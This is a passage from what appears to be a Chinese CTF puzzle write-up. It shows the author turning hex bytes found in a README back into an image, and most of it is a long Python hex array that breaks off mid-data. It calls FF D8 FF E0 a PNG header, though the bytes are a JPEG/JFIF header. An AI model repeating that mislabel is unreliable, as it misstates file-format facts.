alt="006LG7Nygy1g8kvk0ulxyj30oh06dmxz.jpg"></p><p>图片逐个打开后，发现并没有什么特别之处<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g8kvermityj30st0ckdkd.jpg" alt="006LG7Nygy1g8kvermityj30st0ckdkd.jpg"></p><p>打开README.md看的时候，给出了一堆十六进制编码<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g8kvfcxfn9j30yw0okq5o.jpg" alt="006LG7Nygy1g8kvfcxfn9j30yw0okq5o.jpg"></p><p>根据前4个字符来看这是一个图片(PNG后缀)</p><pre><code>PNG文件头：FF D8 FF E0</code></pre><p>py处理一些把十六进制用winhex写入图片里</p><pre><code class="python">data=&#39;&#39;&#39;0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0xFF, 0xFE, 0x00, 0x1F, 0x43, 0x6F, 0x6D, 0x70, 0x72, 0x65, 0x73, 0x73, 0x65, 0x64, 0x20, 0x62, 0x79, 0x20, 0x6A, 0x70, 0x65, 0x67, 0x2D, 0x72, 0x65, 0x63, 0x6F, 0x6D, 0x70, 0x72, 0x65, 0x73, 0x73, 0xFF, 0xDB, 0x00, 0x84, 0x00, 0x04, 0x04, 0x04, 0x04, 0x04, 0x04, 0x04, 0x04, 0x04, 0x04, 0x06, 0x06, 0x05, 0x06, 0x06, 0x08, 0x07, 0x07, 0x07, 0x07, 0x08, 0x0C, 0x09, 0x09, 0x09, 0x09, 0x09, 0x0C, 0x13, 0x0C, 0x0E, 0x0C, 0x0C, 0x0E, 0x0C, 0x13, 0x11, 0x14, 0x10, 0x0F, 0x10, 0x14, 0x11, 0x1E, 0x17, 0x15, 0x15, 0x17, 0x1E, 0x22, 0x1D, 0x1B, 0x1D, 0x22, 0x2A, 0x25, 0x25, 0x2A, 0x34, 0x32, 0x34, 0x44, 0x44, 0x5C, 0x01, 0x04, 0x04, 0x04, 0x04, 0x04, 0x04, 0x04, 0x04, 0x04, 0x04, 0x06, 0x06, 0x05, 0x06, 0x06, 0x08, 0x07, 0x07, 0x07, 0x07, 0x08, 0x0C, 0x09, 0x09, 0x09, 0x09, 0x09, 0x0C, 0x13, 0x0C, 0x0E, 0x0C, 0x0C, 0x0E, 0x0C, 0x13, 0x11, 0x14, 0x10, 0x0F, 0x10, 0x14, 0x11, 0x1E, 0x17, 0x15, 0x15, 0x17, 0x1E, 0x22, 0x1D, 0x1B, 0x1D, 0x22, 0x2A, 0x25, 0x25, 0x2A, 0x34, 0x32, 0x34, 0x44, 0x44, 0x5C, 0xFF, 0xC2, 0x00, 0x11, 0x08, 0x01, 0x0E, 0x01, 0x9D, 0x03, 0x01, 0x22, 0x00, 0x02, 0x11, 0x01, 0x03, 0x11, 0x01, 0xFF, 0xC4, 0x00, 0x1C, 0x00, 0x01, 0x00, 0x03, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x05, 0x06, 0x03, 0x07, 0x02, 0x01, 0x08, 0xFF, 0xDA, 0x00, 0x08, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0xFE, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x8C, 0x56, 0x5A, 0xEA, 0xFC, 0x9F, 0xD3, 0x2A, 0x3D, 0x74, 0x00, 0x00, 0x00, 0x00, 0x00, 0x29, 0xA8, 0x26, 0xF3, 0xAF, 0x91, 0xCF, 0x6B, 0xD8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x94, 0xC1, 0xB2, 0x99, 0x17, 0x33, 0xA8, 0x8D, 0x0F, 0xAE, 0xEF, 0xCE, 0x6F, 0x7C, 0xE2, 0xDB, 0xEF, 0xB7, 0x1D, 0x16, 0xC7, 0xC9, 0xAC, 0x7D, 0x1B, 0xCE, 0x34, 0xB4, 0x1B, 0x2C, 0xD6, 0x77, 0x67, 0x96, 0xD3, 0x4C, 0xA1, 0xBA, 0xAD, 0x9B, 0xDB, 0xCC, 0xAF, 0xCE, 0x15, 0xFE, 0xC9, 0xE3, 0x3F, 0xD1, 0xA0, 0xAF, 0xA4, 0x93, 0x45, 0x41, 0xCB, 0x5F, 0x53, 0x67, 0x03, 0x71, 0x92, 0xB3, 0x85, 0x2A, 0x9E, 0xCA, 0x2D, 0xD6, 0x83, 0x1B, 0xC2, 0xFE, 0x8B, 0xBC, 0x6D, 0x5D, 0x04, 0x1F, 0x8F, 0x99, 0xD0, 0xFE, 0x27, 0x58, 0x22, 0x55, 0xEB, 0x32, 0xB3, 0xE3, 0x37, 0x34, 0x1A, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x4B, 0x03, 0x73, 0x2E, 0xB2, 0x6D, 0x0D, 0xF2, 0x06, 0xC7, 0x01, 0xA8, 0x7D, 0xE4, 0xED, 0x2B, 0xB5, 0x9F, 0x59, 0x4D, 0x27, 0x9F, 0xEF, 0xF9, 0x5D, 0x54, 0x55, 0xCE, 0x81, 0x7D, 0x59, 0x7D, 0x49, 0x53, 0x3E, 0x1C, 0x4D, 0xC5, 0x2C, 0x0B, 0x1F, 0x49, 0x00, 0x55, 0x60, 0xF4, 0xF2, 0x20, 0x54, 0xDE, 0x66, 0xE6, 0xCF, 0xD1, 0x66, 0xAB, 0xAF, 0xEA, 0xFB, 0x4B, 0x87, 0xA0, 0xAF, 0xCD, 0x4F, 0xA8, 0xD1, 0x4B, 0xFB, 0xB3, 0xC5, 0xC0, 0xD8, 0xD1, 0x4E, 0x60, 0xBD, 0x2A, 0x3F, 0xDC, 0x4B, 0xAC, 0xD7, 0xED, 0xBD, 0xFF, 0x00, 0x5E, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0xCB, 0xAA, 0xA6, 0x71, 0x8F, 0xEC, 0xFF, 0x00, 0xA0, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC5, 0xFE, 0xCC, 0x56, 0xEB, 0xA5, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0xCE, 0x69, 0xA5, 0x70, 0x9F, 0x43, 0xAE, 0xC5, 0xDD, 0x7C, 0x6D, 0x31, 0x1D, 0xE8, 0xE6, 0x5A, 0xBB, 0xF3, 0xFC, 0xFB, 0xF4, 0xC0, 0x00, 0x00, 0x00, 0x30, 0x1F, 0x69, 0xF5, 0x33, 0x7A, 0x55, 0xDE, 0x48, 0xAC, 0x85, 0xC7, 0xF7, 0x09, 0xEB, 0x14, 0x96, 0x91, 0x3B, 0x4E, 0xD4, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0xFF, 0xC4, 0x00, 0x14, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xDA, 0x00, 0x08, 0x01, 0x02, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3F, 0xFF, 0xC4, 0x00, 0x14, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xDA, 0x00, 0x08, 0x01, 0x03, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3F, 0xFF, 0xC4, 0x00, 0x2B, 0x10, 0x00, 0x02, 0x03, 0x01, 0x01, 0x00, 0x01, 0x04, 0x02, 0x02, 0x00, 0x07, 0x01, 0x00, 0x00, 0x00, 0x04, 0x05, 0x02, 0x03, 0x06, 0x01, 0x07, 0x13, 0x00, 0x14, 0x15, 0x16, 0x11, 0x12, 0x17, 0x70, 0x20, 0x22, 0x23, 0x25, 0x30, 0x40, 0x50, 0x80, 0xFF, 0xDA, 0x00, 0x08, 0x01, 0x01, 0x00, 0x01, 0x12, 0x00, 0xFF, 0x00, 0x4F, 0x17, 0xE9, 0xFD, 0x50, 0xD3, 0xD6, 0xD5, 0xB2, 0xBD, 0x9C, 0xEE, 0x54, 0x6C, 0x60, 0xAB, 0xB7, 0xFB, 0x98, 0x68, 0x56, 0x2A, 0xE3, 0x69, 0x2D, 0xB8, 0x91, 0x73, 0x4A, 0x9B, 0xB5, 0xB3, 0xBB, 0x97, 0x34, 0x6A, 0x67, 0x41, 0x4C, 0xFF, 0x00, 0xED, 0x35, 0x6C, 0xD8, 0x03, 0x64, 0x72, 0xFB, 0xC3, 0xDD, 0x31, 0x48, 0x0B, 0x7C, 0xF4, 0x16, 0x45, 0xDA, 0x5B, 0x5D, 0x2B, 0x9E, 0xAF, 0x77, 0xA5, 0x5A, 0xFF, 0x00, 0xD2, 0x64, 0x26, 0xA5, 0xDD, 0x16, 0xA4, 0x6C, 0x08, 0xEB, 0x40, 0x23, 0xD1, 0xAF, 0x14, 0xF3, 0xA7, 0x52, 0x18, 0x5B, 0x9E, 0x09, 0xF8, 0x48, 0x49, 0x63, 0x8D, 0xF4, 0x1D, 0x11, 0x13, 0x47, 0x46, 0x8D, 0x54, 0x26, 0x13, 0x6D, 0x1B, 0xE4, 0xE1, 0xB3, 0xFF, 0x00, 0xE6, 0xD1, 0x91, 0x5B, 0x44, 0xB6, 0x72, 0x85, 0xE4, 0xF7, 0xF6, 0x5B, 0xFE, 0x73, 0x3E, 0xB9, 0xE7, 0x60, 0x05, 0xD0, 0xFF, 0x00, 0x13, 0xA0, 0x74, 0xBB, 0xB5, 0x2B, 0x05, 0x61, 0x3F, 0x52, 0xF3, 0xE4, 0x72, 0x69, 0x26, 0xF7, 0xDC, 0x54, 0xED, 0x93, 0x92, 0x1C, 0x4E, 0xAC, 0xEE, 0x0D, 0x6E, 0x6C, 0xC0, 0xCD, 0xA9, 0xB3, 0x23, 0xE4, 0x02, 0xD9, 0x2B, 0x5D, 0x16, 0x7E, 0x5E, 0x2B, 0x23, 0x35, 0x56, 0xFE, 0xDA, 0xFC, 0x50, 0x34, 0x96, 0x42, 0x6D, 0x56, 0xD9, 0xE7, 0x08, 0xFA, 0xC6, 0x44, 0xD4, 0x7B, 0x0A, 0x97, 0xCD, 0x88, 0x8D, 0x2D, 0x50, 0xA7, 0xCD, 0x14, 0xA5, 0x60, 0xBC, 0xD8, 0x39, 0x6C, 0x48, 0xE0, 0x31, 0x60, 0xD0, 0x30, 0x90, 0x84, 0x72, 0xE4, 0xCB, 0x01, 0x66, 0xC2, 0x67, 0x1B, 0x40, 0xF0, 0x85, 0xE5, 0x7F, 0xB2, 0x1F, 0x87, 0xAA, 0xE7, 0xA1, 0x67, 0x52, 0x07, 0xE9, 0x0F, 0x83, 0x5E, 0xE0, 0x17, 0x26, 0xCE, 0x9C, 0xB7, 0xA4, 0xBC, 0xAE, 0xA5, 0xDF, 0xB4, 0xAE, 0x84, 0xD7, 0x9C, 0xE3, 0x4A, 0x15, 0x0C, 0xF0, 0x1E, 0xB4, 0xB7, 0x6A, 0xD0, 0x55, 0x35, 0x56, 0xB2, 0x16, 0x9A, 0xA6, 0x4D, 0x85, 0x8B, 0x8F, 0x4D, 0xE2, 0x5D, 0x78, 0x79, 0xA2, 0xC0, 0x5D, 0xCA, 0x08, 0x66, 0x1A, 0xE8, 0x49, 0x77, 0xA7, 0xB0, 0x2A, 0x6A, 0x89, 0x3B, 0x31, 0x50, 0xAA, 0xD9, 0xB7, 0x70, 0x9C, 0x32, 0x1B, 0xFA, 0xCB, 0xFB, 0x31, 0x37, 0xB5, 0xFC, 0x25, 0x69, 0x0D, 0x69, 0x89, 0x2F, 0x4A, 0x96, 0xFF, 0x00, 0xDF, 0x58, 0xD2, 0xD9, 0xBA, 0x35, 0xCB, 0x7F, 0x20, 0xCE, 0x7A, 0x8B, 0xD5, 0x83, 0x4E, 0x9B, 0xD5, 0xCB, 0xCA, 0x56, 0x11, 0x0E, 0xF3, 0xC0, 0x83, 0xCE, 0x85, 0x41, 0x25, 0x8D, 0x0F, 0x42, 0x78, 0x3E, 0xC5, 0x92, 0xC6, 0xF4, 0x52, 0x3A, 0x70, 0xF5, 0x25, 0xAD, 0xAA, 0x65, 0x7A, 0xE9, 0xEB, 0x12, 0xDC, 0xE5, 0xC6, 0x46, 0x34, 0x46, 0xFC, 0xB1, 0x9A, 0x65, 0x74, 0xE7, 0x74, 0xC7, 0xB2, 0x72, 0xFD, 0x03, 0x74, 0xF4, 0xAF, 0x39, 0x65, 0x00, 0x95, 0xFC, 0x7F, 0x96, 0x4C, 0x5C, 0xB9, 0x44, 0xAD, 0x00, 0x6B, 0x26, 0x71, 0x6F, 0x21, 0xC2, 0xBD, 0x47, 0x42, 0xCD, 0x3D, 0x18, 0x38, 0x84, 0xE1, 0xA2, 0xAA, 0x9A, 0xE8, 0x38, 0x21, 0xB6, 0xDB, 0xBD, 0xD2, 0x4D, 0x42, 0x1A, 0xE7, 0xAB, 0x75, 0x4D, 0x57, 0x6E, 0xC8, 0x4F, 0x61, 0x80, 0xEF, 0x35, 0x1D, 0x46, 0xF2, 0xD5, 0x2D, 0xC9, 0x64, 0x31, 0x5A, 0x25, 0x88, 0x51, 0xB8, 0xDF, 0xBF, 0xDB, 0xF9, 0xB8, 0x0C, 0xF9, 0xCD, 0x7D, 0xED, 0xE2, 0x76, 0x69, 0xF9, 0x02, 0x10, 0x5E, 0xF7, 0x42, 0xE3, 0x15, 0xE9, 0xFB, 0x75, 0x0D, 0x24, 0xBE, 0x94, 0x48, 0xD9, 0x54, 0x00, 0x05, 0xE9, 0x5A, 0x01, 0x8E, 0xDC, 0x3D, 0x59, 0xB8, 0xDA, 0x96, 0xC5, 0x76, 0x55, 0x91, 0xF4, 0x45, 0x46, 0xCD, 0xF5, 0xEE, 0x31, 0xB9, 0xB6, 0x64, 0xC2, 0xB6, 0xE3, 0xB4, 0x3D, 0x63, 0xEA, 0xC5, 0x62, 0xC7, 0xBE, 0x88, 0xE5, 0x34, 0xC9, 0xFE, 0x56, 0x0F, 0x9C, 0x58, 0x5D, 0x74, 0xA5, 0xF4, 0x4F, 0x45, 0x35, 0xB8, 0x75, 0xF1, 0x2A, 0xC2, 0x79, 0x21, 0xB5, 0xF3, 0xE8, 0x4D, 0xBD, 0xF5, 0x12, 0xEA, 0x87, 0x2E, 0x34, 0x01, 0x11, 0xA2, 0x85, 0x73, 0xC2, 0xA1, 0xAD, 0xDB, 0x51, 0x91, 0xE8, 0x57, 0x14, 0x17, 0xCA, 0x09, 0x00, 0x33, 0x27, 0xE7, 0x71, 0xEA, 0xCE, 0xCB, 0x5A, 0xA7, 0xA8, 0xD3, 0xFD, 0xB3, 0x1F, 0x9F, 0x39, 0x23, 0xEA, 0xA7, 0xD2, 0x1A, 0xDF, 0x6C, 0x12, 0xD7, 0x99, 0x1B, 0xBA, 0x6E, 0xBD, 0x25, 0x37, 0x44, 0x23, 0xD6, 0xE4, 0x29, 0x11, 0x78, 0x75, 0x16, 0x0C, 0xB4, 0x1C, 0xDE, 0x8E, 0xF6, 0x2B, 0x70, 0x9E, 0x88, 0x26, 0xCC, 0xD7, 0x6A, 0xE3, 0xD5, 0x52, 0x31, 0x6D, 0x42, 0x5F, 0x64, 0xD6, 0x7A, 0x43, 0xD2, 0x78, 0x02, 0xF5, 0xC8, 0x62, 0xC8, 0xD2, 0x28, 0xD2, 0x9B, 0x2B, 0x4C, 0xF5, 0x4D, 0x3F, 0xEC, 0x40, 0x36, 0x58, 0xB6, 0x04, 0xE7, 0xCC, 0x41, 0x97, 0x24, 0x35, 0xCC, 0x3D, 0x3E, 0xE4, 0xFA, 0x75, 0x99, 0xD6, 0xCB, 0x15, 0x53, 0x22, 0x4F, 0x05, 0x74, 0xA2, 0xE7, 0xD6, 0xDB, 0xF1, 0x17, 0xA1, 0x10, 0xA9, 0x32, 0xBA, 0x4F, 0x44, 0xB1, 0xB1, 0x35, 0xD1, 0x0F, 0x4A, 0x75, 0x03, 0x19, 0x50, 0x76, 0x50, 0x6A, 0xA8, 0x03, 0x46, 0xAB, 0x3D, 0x75, 0xC5, 0x7A, 0x31, 0x7D, 0x66, 0x5A, 0x25, 0x28, 0x2A, 0x25, 0xB4, 0x74, 0x37, 0xA6, 0x1A, 0x1D, 0xF4, 0x9D, 0x48, 0x3A, 0x8B, 0xD7, 0x34, 0xCB, 0x0C, 0x30, 0x3F, 0x06, 0x56, 0xAF, 0xB7, 0x37, 0xD2, 0x0F, 0x8B, 0x7E, 0x23, 0x57, 0x9A, 0xAC, 0xA3, 0x27, 0xA9, 0xBB, 0x3F, 0x57, 0xD2, 0x0F, 0x66, 0x4E, 0xFF, 0x00, 0x4A, 0x02, 0x2A, 0xA2, 0xB7, 0x94, 0xB1, 0x3C, 0xF0, 0x03, 0xFA, 0xD0, 0x6F, 0x49, 0xCC, 0xB6, 0xD8, 0x43, 0x80, 0xD8, 0x5D, 0x6B, 0x44, 0x41, 0x3E, 0x45, 0xEE, 0xC9, 0x9D, 0xBE, 0x47, 0xAF, 0xDA, 0x2C, 0x98, 0x43, 0x30, 0x11, 0x0B, 0x62, 0xC3, 0xBC, 0xBD, 0xEE, 0x8D, 0x62, 0xDD, 0xE7, 0xE3, 0x75, 0x4E, 0x8B, 0xE0, 0x58, 0x46, 0x4E, 0x05, 0xB9, 0x06, 0xC9, 0xAC, 0x74, 0xB4, 0x0A, 0x16, 0x93, 0x48, 0xF4, 0x21, 0x94, 0x10, 0xC1, 0xDD, 0x12, 0x75, 0xBD, 0x5B, 0x83, 0x55, 0xEA, 0x65, 0x6A, 0xF8, 0x47, 0x2E, 0x1C, 0x16, 0x65, 0x22, 0xC7, 0x6F, 0x5F, 0xEB, 0x34, 0x37, 0xE5, 0x3F, 0x29, 0x20, 0xE6, 0xB9, 0xE3, 0xEB, 0x4B, 0x2F, 0x27, 0xA4, 0x66, 0xED, 0xA9, 0xF1, 0x65, 0xB8, 0xDA, 0xD7, 0x7C, 0x35, 0x6D, 0xC0, 0xAC, 0x38, 0x7A, 0x46, 0xB4, 0x04, 0x3B, 0xF8, 0xB4, 0x63, 0x1E, 0x19, 0xD2, 0xF4, 0x17, 0xE6, 0xCC, 0xD5, 0xB1, 0x64, 0xB5, 0x8E, 0x0A, 0x85, 0xE4, 0xFC, 0x55, 0xB0, 0xD1, 0xF0, 0x43, 0x22, 0xBF, 0x75, 0xB8, 0xB9, 0x22, 0xB2, 0xED, 0x75, 0xFC, 0x91, 0x76, 0x73, 0x14, 0x5C, 0xE7, 0xFF, 0x00, 0x11, 0xC8, 0x44, 0x33, 0x40, 0x9B, 0x47, 0x65, 0xB7, 0x44, 0xB5, 0x82, 0x1C, 0x2D, 0x31, 0x1B, 0xCF, 0x52, 0x0F, 0x4A, 0x2A, 0x3B, 0x69, 0x56, 0xD4, 0xA9, 0xA3, 0x56, 0x74, 0xC7, 0x37, 0x93, 0x86, 0x5F, 0x95, 0x53, 0x46, 0x85, 0xC1, 0x81, 0x0C, 0x24, 0x43, 0x0C, 0x46, 0x3E, 0x60, 0xAC, 0xB3, 0x4E, 0x3A, 0x0F, 0xDC, 0x8B, 0x12, 0x5D, 0x0E, 0xF3, 0x83, 0x65, 0x3C, 0xD4, 0xA1, 0x40, 0x81, 0xAE, 0xCB, 0x63, 0xD2, 0xC3, 0x6B, 0xA2, 0x38, 0x15, 0x79, 0x9F, 0x1F, 0x1E, 0x78, 0xB5, 0x0A, 0xB5, 0x0C, 0x9B, 0x4C, 0xDE, 0xE3, 0xAB, 0x41, 0x3A, 0x0F, 0xF3, 0xD5, 0x57, 0x90, 0x61, 0xE2, 0xB5, 0x66, 0x0B, 0x3B, 0x5D, 0xC9, 0xD5, 0x46, 0x9F, 0xE3, 0xE9, 0x4F, 0x1D, 0x90, 0x93, 0xD0, 0xBF, 0x85, 0x2C, 0x96, 0xD0, 0x01, 0xFC, 0x87, 0x9A, 0x29, 0xFC, 0xFC, 0xB4, 0x24, 0x35, 0x64, 0x4C, 0xE6, 0x77, 0xE4, 0x2C, 0x13, 0xBE, 0x46, 0x8A, 0xC5, 0x86, 0xAA, 0x39, 0xD3, 0x82, 0xC6, 0x9A, 0x2B, 0xD0, 0x09, 0xD1, 0x51, 0x08, 0x23, 0xE7, 0x3A, 0x58, 0xD9, 0x77, 0xDD, 0x32, 0x10, 0x11, 0x2D, 0xAC, 0x8F, 0x32, 0x06, 0xC5, 0x32, 0x48, 0x2E, 0x95, 0xE0, 0x60, 0x5B, 0xF9, 0x28, 0x95, 0x4E, 0x87, 0x16, 0x1B, 0x90, 0xF3, 0x22, 0x0A, 0xDD, 0x8A, 0x9B, 0x10, 0x19, 0x02, 0xC0, 0x20, 0x1F, 0x35, 0x54, 0x29, 0xA0, 0x35, 0x25, 0xAB, 0x43, 0x9A, 0x0E, 0xEF, 0xF3, 0x76, 0x9A, 0x67, 0x9E, 0x20, 0x3A, 0xBD, 0x50, 0xE4, 0x48, 0xBF, 0xB5, 0x7C, 0x50, 0xE6, 0xDF, 0x41, 0x9E, 0x56, 0xB1, 0xA0, 0xAE, 0x6B, 0xD1, 0x69, 0x1E, 0xB8, 0xB8, 0xD4, 0xC6, 0xA6, 0x81, 0x3A, 0x1F, 0x3A, 0x44, 0xFB, 0xAE, 0x27, 0x71, 0x87, 0x07, 0xD6, 0xC8, 0x08, 0x42, 0xC7, 0x85, 0x79, 0xF9, 0x47, 0x27, 0x70, 0x89, 0xDF, 0xA0, 0xE8, 0xD8, 0xAC, 0x64, 0xAC, 0xA5, 0xB7, 0x0E, 0x76, 0x1D, 0x31, 0xFB, 0x24, 0xBB, 0x99, 0xCC, 0x9A, 0x9A, 0xAD, 0x1E, 0xD1, 0xF9, 0xC8, 0x2E, 0xE4, 0x1A, 0xDE, 0xD7, 0x85, 0x5D, 0xDF, 0x94, 0x4A, 0x46, 0xFB, 0x75, 0x3E, 0x72, 0xA1, 0x23, 0x52, 0x9B, 0xD2, 0xCD, 0x95, 0xBF, 0x24, 0x1C, 0xD7, 0x50, 0xE2, 0xF9, 0x9A, 0xE5, 0x74, 0xAD, 0xA9, 0x3E, 0x85, 0xDA, 0xD8, 0x0C, 0xA5, 0x7A, 0x82, 0x3B, 0xAF, 0xC8, 0xAA, 0xD8, 0x84, 0xBC, 0x26, 0xD6, 0x11, 0x0A, 0x82, 0x63, 0x41, 0xF0, 0xED, 0x5E, 0x6B, 0x9E, 0xA3, 0xAD, 0xFB, 0x02, 0x0E, 0xFE, 0xCC, 0x34, 0x82, 0xE8, 0xAC, 0xFA, 0x33, 0xCF, 0x55, 0x5A, 0x51, 0x8C, 0x86, 0x68, 0xC8, 0x16, 0x57, 0x3B, 0x93, 0xAA, 0x8C, 0x8F, 0x95, 0x65, 0xFE, 0xD6, 0x02, 0x5D, 0x23, 0x6E, 0xAB, 0xAA, 0x5A, 0x2D, 0xBB, 0xE9, 0x1A, 0x42, 0x13, 0xF0, 0xAE, 0x95, 0xA2, 0x6A, 0xDE, 0xDB, 0xBF, 0xA7, 0x3E, 0x45, 0x98, 0x14, 0x89, 0x4A, 0x1C, 0xB1, 0x89, 0x36, 0x76, 0x52, 0x23, 0x91, 0x63, 0xCA, 0x7C, 0xAB, 0x3D, 0x44, 0x13, 0xD7, 0x03, 0x58, 0xFF, 0x00, 0x0B, 0x81, 0xCE, 0x03, 0x4F, 0xD3, 0x1F, 0x30, 0x56, 0x59, 0xA7, 0x1D, 0x07, 0xEE, 0x45, 0x89, 0x2E, 0x87, 0x79, 0xC1, 0x98, 0x79, 0x5A, 0x87, 0x7F, 0x7F, 0x17, 0x6F, 0x9D, 0xB1, 0xA0, 0x85, 0xEC, 0x97, 0xD3, 0x57, 0x3C, 0xE1, 0x6F, 0x55, 0x36, 0x5D, 0x7B, 0xA6, 0xB7, 0x10, 0xC1, 0xC0, 0x6E, 0xAC, 0x61, 0xFE, 0x31, 0x5B, 0x4D, 0x77, 0x5D, 0x46, 0x81, 0xCD, 0x4D, 0x64, 0xEE, 0xC7, 0x50, 0x68, 0x57, 0x94, 0xA7, 0xBE, 0x71, 0x23, 0x8F, 0xDE, 0x57, 0x6F, 0x03, 0x59, 0x44, 0xED, 0x5B, 0xE7, 0x6A, 0x16, 0x9E, 0x33, 0x5F, 0xCA, 0xB3, 0x28, 0xBA, 0x5E, 0x92, 0xF6, 0x56, 0xA5, 0xC5, 0xD2, 0x88, 0xFF, 0x00, 0x9C, 0x17, 0xAD, 0xB8, 0xBE, 0x37, 0x94, 0x45, 0x2A, 0x58, 0xE3, 0xC6, 0x2D, 0x8B, 0x87, 0x03, 0x3B, 0x6A, 0xB9, 0x8B, 0x1A, 0x57, 0x55, 0x3B, 0xFF, 0x00, 0x41, 0x4F, 0x0C, 0x7E, 0x93, 0x19, 0x61, 0xA7, 0x5A, 0x3B, 0xDA, 0x98, 0x44, 0xF2, 0xCC, 0xF2, 0xA0, 0x5B, 0x8C, 0xC4, 0x7D, 0x1E, 0xA9, 0xF3, 0x89, 0x12, 0x90, 0xF4, 0xB4, 0xDA, 0x56, 0x61, 0x75, 0xCE, 0xD3, 0xE8, 0x7E, 0x5B, 0xEA, 0x35, 0x78, 0x64, 0x03, 0xF4, 0x37, 0x94, 0x27, 0x1E, 0x00, 0xAD, 0xEB, 0xD7, 0x77, 0x67, 0x42, 0x26, 0xB2, 0x45, 0x41, 0x3F, 0x3A, 0x47, 0x58, 0x03, 0x0B, 0x41, 0x67, 0x52, 0x40, 0xAF, 0x8C, 0x7A, 0x21, 0xA0, 0x79, 0xF9, 0x69, 0x2E, 0x2F, 0xAA, 0x3D, 0x07, 0x46, 0x20, 0x44, 0x34, 0x31, 0x9C, 0x81, 0x73, 0xE5, 0x59, 0xA7, 0xB9, 0x99, 0x65, 0x8C, 0xBC, 0xE8, 0x8F, 0xF9, 0x83, 0x5B, 0xD4, 0x49, 0x8B, 0x62, 0x65, 0xAB, 0x6D, 0xFB, 0x9B, 0xA9, 0xFB, 0x32, 0xF8, 0x4F, 0x39, 0x56, 0x3A, 0x15, 0x0F, 0x48, 0xFC, 0x7C, 0xCA, 0x5C, 0xAC, 0x45, 0xE3, 0x7F, 0x7F, 0xF5, 0x16, 0x65, 0xBB, 0x13, 0x74, 0xDE, 0x92, 0xB8, 0xB2, 0x3E, 0x41, 0x55, 0x34, 0x0A, 0x80, 0xE1, 0x0F, 0x6B, 0x85, 0x41, 0x6A, 0x2D, 0xBD, 0x2A, 0xF9, 0x94, 0xAB, 0x3D, 0x7B, 0xDE, 0x0B, 0x7F, 0xA5, 0xBD, 0x00, 0xF6, 0xA2, 0x34, 0xC8, 0x0F, 0x4D, 0x4A, 0xD8, 0xA7, 0x14, 0xDB, 0x76, 0xBB, 0xAB, 0x31, 0xBA, 0x1E, 0x90, 0x65, 0xB2, 0x92, 0x51, 0x32, 0x2D, 0x9A, 0x90, 0x32, 0xBF, 0x5C, 0x1C, 0xF0, 0x34, 0xD3, 0x18, 0x64, 0x64, 0x1E, 0x9E, 0x0B, 0xEE, 0xB3, 0xA8, 0x3D, 0x5C, 0x67, 0x13, 0x51, 0xF3, 0x02, 0x24, 0x06, 0x25, 0xC3, 0x04, 0xB7, 0x9A, 0x1F, 0xAD, 0xB1, 0xBE, 0x05, 0x34, 0x82, 0x0B, 0xA7, 0xC2, 